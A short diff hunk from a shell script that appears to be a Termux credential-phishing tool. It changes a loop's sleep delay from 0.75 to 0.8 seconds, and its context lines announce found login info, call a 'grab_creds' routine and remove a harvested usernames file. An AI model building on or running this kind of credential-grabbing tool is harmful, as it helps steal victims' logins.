@@ -946,7 +946,7 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\
 grab_creds
 rm -rf .termuxhackz/www/usernames.txt
 fi
-sleep 0.75
+sleep 0.8
 
 
 done 
